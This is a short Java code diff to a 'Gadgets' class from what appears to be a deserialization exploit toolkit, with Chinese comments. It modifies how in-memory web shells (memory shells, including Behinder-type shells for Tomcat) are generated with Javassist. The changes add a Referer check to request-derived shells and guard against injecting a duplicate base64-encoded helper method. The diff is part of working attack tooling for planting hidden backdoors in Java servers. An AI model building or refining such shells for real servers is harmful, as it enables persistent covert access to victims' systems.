@@ -240,6 +240,13 @@ public class Gadgets {
 				} else if (className.contains("EXMS")) {
 					insertKeyMethod(ctClass, "execute");
 				} else if (!Objects.equals(cName, "")) {
+
+					// 从 Request 中获取的内存马逻辑需要 Referer 判断
+					if (className.contains("FromRequest")) {
+						String referer = "referer=\"" + REFERER + "\";";
+						ctClass.makeClassInitializer().insertBefore(referer);
+					}
+
 					insertKeyMethod(ctClass, cName);
 				}
 			}
@@ -378,7 +385,13 @@ public class Gadgets {
 			// 冰蝎类型的内存马
 			case "bx":
 				ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
-				ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
+
+				try {
+					ctClass.getDeclaredMethod("getFieldValue");
+				} catch (NotFoundException e) {
+					ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
+				}
+
 				ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
 
 				if (isTomcat) {
